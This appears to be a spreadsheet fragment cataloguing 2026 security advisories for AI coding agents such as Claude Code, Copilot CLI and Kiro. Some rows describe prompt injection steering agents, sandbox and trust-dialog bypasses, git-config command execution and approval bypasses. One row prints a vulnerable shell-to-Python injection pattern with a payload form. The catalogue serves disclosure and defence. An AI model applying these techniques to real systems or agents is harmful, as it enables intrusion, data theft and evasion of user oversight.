      <c r="D123" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E123" s="8" t="inlineStr">
        <is>
          <t>2026-04-16</t>
        </is>
      </c>
      <c r="F123" s="9" t="inlineStr">
        <is>
          <t>Paperclip: codex_local inherited ChatGPT/OpenAI-connected Gmail and was able to send real email</t>
        </is>
      </c>
      <c r="G123" s="9" t="inlineStr">
        <is>
          <t>### Summary  A Paperclip-managed `codex_local` runtime was able to access and use a Gmail connector that I had connected in the ChatGPT/OpenAI apps UI, even though I had not explicitly connected Gmail inside Paperclip or separately inside Codex.  In my environment this enabled mailbox access and a real outbound email to be sent from my Gmail account. After I manually intervened to stop the workflow, follow-up retraction messages were also sent, confirming repeated outward write/send capability.  This appears to be a trust-boundary failure between Paperclip-managed Codex execution and inherited OpenAI app connectors, amplified by dangerous-by-default runtime settings.  ### Details  Successful runtime calls include:  - `mcp__codex_apps__gmail_get_profile` - `mcp__codex_apps__gmail_search_emails` - `mcp__codex_apps__gmail_send_email`  The connected Gmail profile resolved to my personal account.  Inside the Paperclip-managed `codex-home`, I also found cached OpenAI curated connector state for Gmail under a path like:  - `codex-home/plugins/cache/openai-curated/gmail/.../.app.json`  This strongly suggests that the runtime had access to an already connected OpenAI apps surface rather than a Paperclip-specific Gmail integration that I intentionally configured.  Separately, in the installed Paperclip code, `codex_local` defaults `dangerouslyBypassApprovalsAndSandbox` to `true`, and the server-side agent creation path applies that default when the flag is omitted. In practice, that makes this boundary failure much more dangerous because a newly created `codex_local` agent can operate with approvals and sandbox bypassed by default.  The key issue is this: I had connected Gmail only in the ChatGPT/OpenAI apps UI. I had not intentionally connected Gmail inside Paperclip or separately inside Codex. Despite that, the Paperclip-managed `codex_local` runtime was able to use Gmail read/write actions.  ### PoC  Environment:  - self-hosted Paperclip instance using `codex_local` - Gmail connected in the ChatGPT/OpenAI apps UI - no explicit Gmail connection configured inside Paperclip for this test - `codex_local` agent created and run with default behavior  Observed reproduction path:  1. Connect Gmail in the ChatGPT/OpenAI apps UI. 2. Create or run a Paperclip `codex_local` agent. 3. Execute a task that inspects mailbox state or performs outward communication. 4. Observe successful Gmail connector calls such as:    - `mcp__codex_apps__gmail_get_profile`    - `mcp__codex_apps__gmail_search_emails`    - `mcp__codex_apps__gmail_send_email` 5. Observe that the connected profile resolves to the ChatGPT/OpenAI-connected Gmail account and that mailbox reads and real sends are possible.  Private evidence available on request:  - successful `get_profile` / `search` / `send` logs - Paperclip-managed `codex-home` Gmail connector cache path(s) - screenshot showing Gmail write-capable actions such as `send_email`, `send_draft`, and `update_draft` exposed in the connected-app UI</t>
        </is>
      </c>
      <c r="H123" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-gqqj-85qm-8qhf</t>
        </is>
      </c>
    </row>
    <row r="124">
      <c r="A124" s="8" t="inlineStr">
        <is>
          <t>CA-111</t>
        </is>
      </c>
      <c r="B124" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C124" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D124" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E124" s="8" t="inlineStr">
        <is>
          <t>2026-04-17</t>
        </is>
      </c>
      <c r="F124" s="9" t="n"/>
      <c r="G124" s="9" t="inlineStr">
        <is>
          <t>In JetBrains Junie before 252.549.29 command execution was possible via malicious project file</t>
        </is>
      </c>
      <c r="H124" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-qc74-2r45-g2fp</t>
        </is>
      </c>
    </row>
    <row r="125">
      <c r="A125" s="8" t="inlineStr">
        <is>
          <t>CA-112</t>
        </is>
      </c>
      <c r="B125" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C125" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D125" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E125" s="8" t="inlineStr">
        <is>
          <t>2026-04-21</t>
        </is>
      </c>
      <c r="F125" s="9" t="inlineStr">
        <is>
          <t>Claude Code: Sandbox Escape via Symlink Following Allows Arbitrary File Write Outside Workspace</t>
        </is>
      </c>
      <c r="G125" s="9" t="inlineStr">
        <is>
          <t>Claude Code's sandbox did not prevent sandboxed processes from creating symlinks pointing to locations outside the workspace. When Claude Code subsequently wrote to a path within such a symlink, its unsandboxed process followed the symlink and wrote to the target location outside the workspace without prompting the user for confirmation. This allowed a sandbox escape where neither the sandboxed command nor the unsandboxed app could independently write outside the workspace, but their combination could write to arbitrary locations, potentially leading to code execution outside the sandbox. Reliably exploiting this required the ability to add untrusted content into a Claude Code context window to trigger sandboxed code execution via prompt injection.  Users on standard Claude Code auto-update have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Claude Code thanks hackerone.com/philts for reporting this issue.</t>
        </is>
      </c>
      <c r="H125" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vp62-r36r-9xqp</t>
        </is>
      </c>
    </row>
    <row r="126">
      <c r="A126" s="8" t="inlineStr">
        <is>
          <t>CA-114</t>
        </is>
      </c>
      <c r="B126" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C126" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D126" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E126" s="8" t="inlineStr">
        <is>
          <t>2026-04-24</t>
        </is>
      </c>
      <c r="F126" s="9" t="inlineStr">
        <is>
          <t>Claude Code: Trust Dialog Bypass via Git Worktree Spoofing Allows Arbitrary Code Execution</t>
        </is>
      </c>
      <c r="G126" s="9" t="inlineStr">
        <is>
          <t>Claude Code used the git worktree `commondir` file when determining folder trust but did not validate its contents. By crafting a repository with a `commondir` file pointing to a path the victim had previously trusted, an attacker could bypass the trust dialog and immediately execute malicious hooks defined in `.claude/settings.json`. Exploiting this required the victim to clone a malicious repository and run Claude Code within it, and for the attacker to know or guess a path the victim had already trusted.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Claude Code thanks [hackerone.com/masato_anzai](https://hackerone.com/masato_anzai) for reporting this issue.</t>
        </is>
      </c>
      <c r="H126" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-q5hj-mxqh-vv77</t>
        </is>
      </c>
    </row>
    <row r="127">
      <c r="A127" s="8" t="inlineStr">
        <is>
          <t>CA-115</t>
        </is>
      </c>
      <c r="B127" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C127" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D127" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E127" s="8" t="inlineStr">
        <is>
          <t>2026-04-27</t>
        </is>
      </c>
      <c r="F127" s="9" t="n"/>
      <c r="G127" s="9" t="inlineStr">
        <is>
          <t>A flaw has been found in disler aider-mcp-server up to b2516fa466d0d851932da92ee6d0e66946db9efc. Affected by this vulnerability is an unknown functionality of the file src/aider_mcp_server/server.py of the component aider_ai_code. This manipulation of the argument relative_editable_files causes command injection. Remote exploitation of the attack is possible. The exploit has been published and may be used. This product follows a rolling release approach for continuous delivery, so version details for affected or updated releases are not provided. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H127" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-cqv7-q5jh-6mfp</t>
        </is>
      </c>
    </row>
    <row r="128">
      <c r="A128" s="8" t="inlineStr">
        <is>
          <t>CA-116</t>
        </is>
      </c>
      <c r="B128" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C128" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D128" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E128" s="8" t="inlineStr">
        <is>
          <t>2026-04-29</t>
        </is>
      </c>
      <c r="F128" s="9" t="n"/>
      <c r="G128" s="9" t="inlineStr">
        <is>
          <t>A vulnerability has been found in eiliyaabedini aider-mcp up to 667b914301aada695aab0e46d1fb3a7d5e32c8af. Affected is an unknown function of the file aider_mcp.py of the component code_with_ai. The manipulation of the argument working_dir/editable_files leads to command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. This product uses a rolling release model to deliver continuous updates. As a result, specific version information for affected or updated releases is not available. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H128" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3qf4-9783-vxr5</t>
        </is>
      </c>
    </row>
    <row r="129">
      <c r="A129" s="8" t="inlineStr">
        <is>
          <t>CA-118</t>
        </is>
      </c>
      <c r="B129" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C129" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D129" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E129" s="8" t="inlineStr">
        <is>
          <t>2026-05-11</t>
        </is>
      </c>
      <c r="F129" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot CLI: Nested Bare Repository Can Execute Arbitrary Commands via core.fsmonitor</t>
        </is>
      </c>
      <c r="G129" s="9" t="inlineStr">
        <is>
          <t>## Summary  A security vulnerability has been identified in GitHub Copilot CLI where a malicious bare git repository nested inside a project directory can achieve arbitrary code execution when the agent performs git operations. By exploiting git's automatic bare repository discovery during directory traversal, an attacker can set `core.fsmonitor` or other executable config keys to run arbitrary commands without user awareness or approval.  ## Details  Git supports bare repositories — repositories without a working tree — which can be discovered automatically when git traverses the directory hierarchy looking for a `.git` directory. When git discovers a bare repository, it reads and applies its configuration, including keys that specify external commands to execute.  The vulnerability arises because git's `core.fsmonitor` config key (and 15+ similar keys such as `core.hookspath`, `diff.external`, `merge.tool`, etc.) can specify arbitrary shell commands that git will execute as part of normal operations like `status`, `diff`, or `rev-parse`.  ### Attack Scenario  An attacker can exploit this by:  1. Creating a bare git repository nested inside a seemingly normal project directory (e.g., `vendor/malicious.git/` or a deeply nested subdirectory) 2. Configuring `core.fsmonitor` (or similar keys) in that bare repository to execute a malicious command 3. When GitHub Copilot CLI performs any git operation that traverses into or through that directory, git auto-discovers the bare repository, reads its config, and executes the attacker's command  This can occur when: - The agent navigates into a subdirectory containing the buried bare repo - The agent runs `git status`, `git diff`, or other routine git commands - The agent uses tools like `grep` or `glob` that may trigger git operations in subdirectories  Prior to the fix, the CLI had no protection against git auto-discovering bare repositories during directory traversal.  ## Impact  An attacker who can place a malicious bare repository inside a project — for example, through: - A pull request adding a directory that contains a bare repository - A compromised or malicious dependency that includes a bare repository - A cloned repository that already contains nested bare repositories  — could achieve arbitrary code execution on the user's workstation whenever GitHub Copilot CLI performs git operations in or near the malicious directory.  Successful exploitation could lead to data exfiltration, credential theft, file modification, or further system compromise.  ## Affected Versions  - GitHub Copilot CLI versions prior to 1.0.42  ## Remediation and Mitigation  ### Fix  The fix sets `safe.bareRepository=explicit` via git's `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_*` / `GIT_CONFIG_VALUE_*` environment variable mechanism, which has the highest precedence over all config file sources. This prevents git from automatically discovering and using bare repositories during directory traversal — only explicitly allowlisted ba</t>
        </is>
      </c>
      <c r="H129" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-9ccr-r5hg-74gf</t>
        </is>
      </c>
    </row>
    <row r="130">
      <c r="A130" s="8" t="inlineStr">
        <is>
          <t>CA-119</t>
        </is>
      </c>
      <c r="B130" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C130" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D130" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E130" s="8" t="inlineStr">
        <is>
          <t>2026-05-12</t>
        </is>
      </c>
      <c r="F130" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot and Visual Studio Code Security Feature Bypass Vulnerability</t>
        </is>
      </c>
      <c r="G130" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements in output used by a downstream component ('injection') in GitHub Copilot and Visual Studio allows an unauthorized attacker to bypass a security feature over a network.</t>
        </is>
      </c>
      <c r="H130" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-41109</t>
        </is>
      </c>
    </row>
    <row r="131">
      <c r="A131" s="8" t="inlineStr">
        <is>
          <t>CA-120</t>
        </is>
      </c>
      <c r="B131" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C131" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D131" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E131" s="8" t="inlineStr">
        <is>
          <t>2026-05-12</t>
        </is>
      </c>
      <c r="F131" s="9" t="inlineStr">
        <is>
          <t>nnU-Net: Agentic workflow injection in `.github/workflows/issue-triage.yml` of `MIC-DKFZ/nnUNet`</t>
        </is>
      </c>
      <c r="G131" s="9" t="inlineStr">
        <is>
          <t>nnU-Net is a semantic segmentation framework that automatically adapts its pipeline to a dataset. Prior to 2.4.1, the nnU-Net Issue Triage workflow in .github/workflows/issue-triage.yml is vulnerable to Agentic Workflow Injection. The workflow sets allowed_non_write_users: ${{ github.event.issue.user.login }}, which means any logged-in GitHub user who opens an issue can reach this agentic workflow with attacker-controlled content. Untrusted issue title and body content are embedded directly into the prompt of anthropics/claude-code-action, and the workflow then runs a command-capable Claude agent with permission to comment on and relabel the current issue via gh. Because this workflow is triggered automatically on issues.opened, an external attacker can submit a crafted issue that steers the agent beyond its intended issue-triage purpose and influences authenticated issue actions. This vulnerability is fixed in 2.4.1.</t>
        </is>
      </c>
      <c r="H131" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-44246</t>
        </is>
      </c>
    </row>
    <row r="132">
      <c r="A132" s="8" t="inlineStr">
        <is>
          <t>CA-121</t>
        </is>
      </c>
      <c r="B132" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C132" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D132" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E132" s="8" t="inlineStr">
        <is>
          <t>2026-05-13</t>
        </is>
      </c>
      <c r="F132" s="9" t="inlineStr">
        <is>
          <t>Claude Desktop: SSH Host Key Verification Bypass Allows Man-in-the-Middle Attack on Remote Sessions</t>
        </is>
      </c>
      <c r="G132" s="9" t="inlineStr">
        <is>
          <t>The Claude Desktop app gives you Claude Code with a graphical interface built for running multiple sessions side by side. From 1.2581.0 to before 1.4304.0, Claude Desktop's SSH remote development feature verified only whether a hostname existed in ~/.ssh/known_hosts without comparing the server's presented host key against the stored key. This allowed a network-positioned attacker to present an arbitrary SSH host key and have the connection silently accepted, enabling a man-in-the-middle attack on remote development sessions. Successful exploitation required the attacker to be in a network position to intercept SSH traffic (e.g., via ARP spoofing, rogue Wi-Fi, or DNS poisoning) and the target hostname to already have an entry in the victim's known_hosts file. This vulnerability is fixed in 1.4304.0.</t>
        </is>
      </c>
      <c r="H132" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-44467</t>
        </is>
      </c>
    </row>
    <row r="133">
      <c r="A133" s="8" t="inlineStr">
        <is>
          <t>CA-122</t>
        </is>
      </c>
      <c r="B133" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C133" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D133" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E133" s="8" t="inlineStr">
        <is>
          <t>2026-05-13</t>
        </is>
      </c>
      <c r="F133" s="9" t="inlineStr">
        <is>
          <t>Claude Desktop: Local Privilege Escalation via Directory Junction in CoworkVMService</t>
        </is>
      </c>
      <c r="G133" s="9" t="inlineStr">
        <is>
          <t>The Claude Desktop app gives you Claude Code with a graphical interface built for running multiple sessions side by side. Prior to 1.3834.0, the CoworkVMService component in Claude Desktop for Windows ran as SYSTEM and did not validate whether the VM bundle directory was a real directory or an NTFS directory junction before creating files within it. A local non-elevated user could replace the user-writable VM bundle directory with a directory junction pointing to an attacker-chosen location, causing the service to create a SYSTEM-owned file in an arbitrary directory. This could be leveraged for local privilege escalation. This vulnerability is fixed in 1.3834.0.</t>
        </is>
      </c>
      <c r="H133" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-44470</t>
        </is>
      </c>
    </row>
    <row r="134">
      <c r="A134" s="8" t="inlineStr">
        <is>
          <t>CA-123</t>
        </is>
      </c>
      <c r="B134" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C134" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D134" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E134" s="8" t="inlineStr">
        <is>
          <t>2026-05-13</t>
        </is>
      </c>
      <c r="F134" s="9" t="inlineStr">
        <is>
          <t>claude-code-cache-fix vulnerable to local code execution via Python triple-quote injection in tools/quota-statusline.sh</t>
        </is>
      </c>
      <c r="G134" s="9" t="inlineStr">
        <is>
          <t>## Summary  `tools/quota-statusline.sh` (introduced in v3.5.0) interpolates Claude Code's hook stdin payload directly into a Python triple-quoted string literal. A `'''` byte sequence in any user-controlled field of the payload closes the literal early and lets following bytes execute as Python in the user's Claude Code process.  ## Affected versions  - v3.5.0 - v3.5.1  ## Patched versions  - v3.5.2  ## Affected configurations  Users who wired `tools/quota-statusline.sh` into Claude Code's `statusLine` configuration. The v3.5.0 README explicitly recommends this setup, so most users on v3.5.0/v3.5.1 with the recommended setup are affected.  ## Attack chain  Claude Code's statusline hook payload reflects user-controlled paths (`cwd`, `workspace.current_dir`, `workspace.project_dir`, `transcript_path`). Apostrophes are legal in POSIX filesystem paths.  1. A hostile directory name containing `'''+payload+'''` lands on disk via any normal vector — `git clone`, archive extraction, npm package, downloaded zip, etc. 2. The victim has the recommended `tools/quota-statusline.sh` wired into their CC `statusLine` config. 3. The victim `cd`s anywhere a hostile path is reachable. 4. CC fires the statusline hook on every redraw. The Python literal closes early. The injected bytes execute as Python in the user's process.  ## Severity  Local code execution at user privilege. Persistent re-fire on every statusline redraw. No user interaction beyond `cd`-ing into the hostile path. The user's shell, CC session, files, SSH keys, and any locally-accessible credentials are reachable from the executed code.  ## Vulnerable pattern  ```sh input=$(cat) result=$(python3 -c "     stdin_data = json.loads('''$input''') if '''$input''' else {} ") ```  ## Fix  Capture stdin in bash, export to env, and pipe the Python source through a single-quoted heredoc (`&lt;&lt;'PYEOF'`). Single-quoting disables ALL bash interpolation inside the body. Python reads the JSON via `os.environ.get('CC_INPUT')`, where the bytes are inert at every layer.  ```sh CC_INPUT=$(cat) export CC_INPUT  python3 &lt;&lt;'PYEOF' 2&gt;/dev/null import os, json try:     cc_input = json.loads(os.environ.get('CC_INPUT') or '{}') except Exception:     cc_input = {} # ... PYEOF ```  ## Workarounds  Until upgrading to v3.5.2:  - Disable the statusline by removing the `statusLine` entry from `~/.claude/settings.json`, or - Replace `tools/quota-statusline.sh` with a script that does NOT pass stdin through `python3 -c "..."` (a heredoc + env var rewrite is safe)  ## Credit  Reported by Jakob Linke (@schuay) via GitHub issue [#108](https://github.com/cnighswonger/claude-code-cache-fix/issues/108).  ## Timeline  - 2026-05-07 — reported (#108) - 2026-05-07 — confirmed, fix implemented (#110) - 2026-05-07 — v3.5.2 published</t>
        </is>
      </c>
      <c r="H134" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-g3xq-3gmv-qq8g</t>
        </is>
      </c>
    </row>
    <row r="135">
      <c r="A135" s="8" t="inlineStr">
        <is>
          <t>CA-124</t>
        </is>
      </c>
      <c r="B135" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C135" s="8" t="inlineStr">
        <is>
          <t>Kilo Code</t>
        </is>
      </c>
      <c r="D135" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E135" s="8" t="inlineStr">
        <is>
          <t>2026-05-18</t>
        </is>
      </c>
      <c r="F135" s="9" t="n"/>
      <c r="G135" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was detected in Kilo-Org kilocode up to 7.0.47. This vulnerability affects the function Bun.file of the file packages/opencode/src/kilocode/review/worktree-diff.ts of the component File Diff API Endpoint. Performing a manipulation of the argument File results in path traversal. It is possible to initiate the attack remotely. The exploit is now public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</t>
        </is>
      </c>
      <c r="H135" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-mwv7-rw63-qfm9</t>
        </is>
      </c>
    </row>
    <row r="136">
      <c r="A136" s="8" t="inlineStr">
        <is>
          <t>CA-125</t>
        </is>
      </c>
      <c r="B136" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C136" s="8" t="inlineStr">
        <is>
          <t>Kilo Code</t>
        </is>
      </c>
      <c r="D136" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E136" s="8" t="inlineStr">
        <is>
          <t>2026-05-18</t>
        </is>
      </c>
      <c r="F136" s="9" t="inlineStr">
        <is>
          <t>@kilocode/cli Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor</t>
        </is>
      </c>
      <c r="G136" s="9" t="inlineStr">
        <is>
          <t>A flaw has been found in Kilo-Org kilocode up to 7.0.47. This issue affects the function Load of the file packages/opencode/src/config/config.ts of the component Environment Variable Handler. Executing a manipulation of the argument KILO_CONFIG_CONTENT can lead to information disclosure. It is possible to launch the attack remotely. The exploit has been published and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</t>
        </is>
      </c>
      <c r="H136" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-rpc6-9c4p-j5cg</t>
        </is>
      </c>
    </row>
    <row r="137">
      <c r="A137" s="8" t="inlineStr">
        <is>
          <t>CA-126</t>
        </is>
      </c>
      <c r="B137" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C137" s="8" t="inlineStr">
        <is>
          <t>Continue</t>
        </is>
      </c>
      <c r="D137" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E137" s="8" t="inlineStr">
        <is>
          <t>2026-05-18</t>
        </is>
      </c>
      <c r="F137" s="9" t="n"/>
      <c r="G137" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was identified in continuedev continue up to 1.2.22. This affects the function lsTool of the file core/tools/implementations/lsTool.ts of the component JSON-RPC Server. Such manipulation of the argument dirPath leads to path traversal. An attack has to be approached locally. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.</t>
        </is>
      </c>
      <c r="H137" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2c7p-5h72-cjj3</t>
        </is>
      </c>
    </row>
    <row r="138">
      <c r="A138" s="8" t="inlineStr">
        <is>
          <t>CA-127</t>
        </is>
      </c>
      <c r="B138" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C138" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D138" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E138" s="8" t="inlineStr">
        <is>
          <t>2026-05-19</t>
        </is>
      </c>
      <c r="F138" s="9" t="inlineStr">
        <is>
          <t>MLflow: Improper Origin Validation in MLflow Assistant /ajax-api Endpoints Enables Browser-Mediated Local Command Execution</t>
        </is>
      </c>
      <c r="G138" s="9" t="inlineStr">
        <is>
          <t>In MLflow version 3.9.0, the MLflow Assistant feature introduced improper origin validation in its /ajax-api endpoints. This vulnerability allows a remote attacker to exploit cross-origin requests from a malicious webpage to interact with the MLflow Assistant running on a victim's local machine. By bypassing the loopback-only restriction, the attacker can modify the Assistant's configuration to enable full access, which in turn allows the execution of arbitrary commands via the Claude Code sub-agent. This issue is resolved in version 3.10.0.</t>
        </is>
      </c>
      <c r="H138" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-67c5-x5mf-rppq</t>
        </is>
      </c>
    </row>
    <row r="139">
      <c r="A139" s="8" t="inlineStr">
        <is>
          <t>CA-128</t>
        </is>
      </c>
      <c r="B139" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C139" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D139" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E139" s="8" t="inlineStr">
        <is>
          <t>2026-05-26</t>
        </is>
      </c>
      <c r="F139" s="9" t="n"/>
      <c r="G139" s="9" t="inlineStr">
        <is>
          <t>Missing input source validation in the tool authorization prompt in Kiro CLI before 1.28.0 allows a local attacker to execute arbitrary tools, including shell commands, without user approval by crafting content that is piped to kiro-cli via stdin.    We recommend you to upgrade to kiro-cli version 1.28.0 or later.</t>
        </is>
      </c>
      <c r="H139" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-cv6r-hx5v-c4m6</t>
        </is>
      </c>
    </row>
    <row r="140">
      <c r="A140" s="8" t="inlineStr">
        <is>
          <t>CA-129</t>
        </is>
      </c>
      <c r="B140" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C140" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D140" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E140" s="8" t="inlineStr">
        <is>
          <t>2026-05-26</t>
        </is>
      </c>
      <c r="F140" s="9" t="n"/>
      <c r="G140" s="9" t="inlineStr">
        <is>
          <t>A security flaw has been discovered in dazeb cline-mcp-memory-bank up to 55c81b9cf6c16700983c84dc4cdea3cafa19a75f. The affected element is the function handleInitializeMemoryBank of the file src/index.ts. The manipulation of the argument projectPath results in path traversal. The attack may be performed from remote. The exploit has been released to the public and may be used for attacks. This product utilizes a rolling release system for continuous delivery, and as such, version information for affected or updated releases is not disclosed. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H140" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2fh4-hw94-qg7r</t>
        </is>
      </c>
    </row>
    <row r="141">
      <c r="A141" s="8" t="inlineStr">
        <is>
          <t>CA-130</t>
        </is>
      </c>
      <c r="B141" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C141" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D141" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E141" s="8" t="inlineStr">
        <is>
          <t>2026-05-27</t>
        </is>
      </c>
      <c r="F141" s="9" t="inlineStr">
        <is>
          <t>Gryph Agents Payload Filter Fails to Strip Tool Payload for Sensitive Content</t>
        </is>
      </c>
      <c r="G141" s="9" t="inlineStr">
        <is>
          <t>Gryph provides a security layer for AI coding agents. Prior to 0.7.0, Gryph implements logging levels that determine what content is logged to a local sqlite database. The README incorrectly mentions that the default log level is minimal while it is standard. Source code review shows sensitive file-write content remains in the stored payload as ContentPreview, OldString, or NewString at the default standard logging level and at full. This leads to logging of potentially sensitive file content in the local sqlite database, violating Gryphs sensitive file filter and log level contracts. This vulnerability is fixed in 0.7.0.</t>
        </is>
      </c>
      <c r="H141" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-45046</t>
        </is>
      </c>
    </row>
    <row r="142">
      <c r="A142" s="8" t="inlineStr">
        <is>
          <t>CA-131</t>
        </is>
      </c>
      <c r="B142" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C142" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D142" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E142" s="8" t="inlineStr">
        <is>
          <t>2026-05-28</t>
        </is>
      </c>
      <c r="F142" s="9" t="inlineStr">
        <is>
          <t>CodeWhale: SSRF via HTTP Redirect Bypass in fetch_url Tool</t>
        </is>
      </c>
      <c r="G142" s="9" t="inlineStr">
        <is>
          <t>CodeWhale is a DeepSeek + MiMo coding agent in terminal. Prior to 0.8.22, the fetch_url tool validates the initial URL's resolved IP address against a restricted-IP blocklist (is_restricted_ip()) to prevent SSRF attacks against internal services (cloud metadata endpoints, localhost, private networks). However, the HTTP client (reqwest) is configured to automatically follow up to 5 redirects (reqwest::redirect::Policy::limited(5)) without re-validating the redirect target against the same SSRF protections. This vulnerability is fixed in 0.8.22.</t>
        </is>
      </c>
      <c r="H142" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-45310</t>
        </is>
      </c>
    </row>
    <row r="143">
      <c r="A143" s="8" t="inlineStr">
        <is>
          <t>CA-134</t>
        </is>
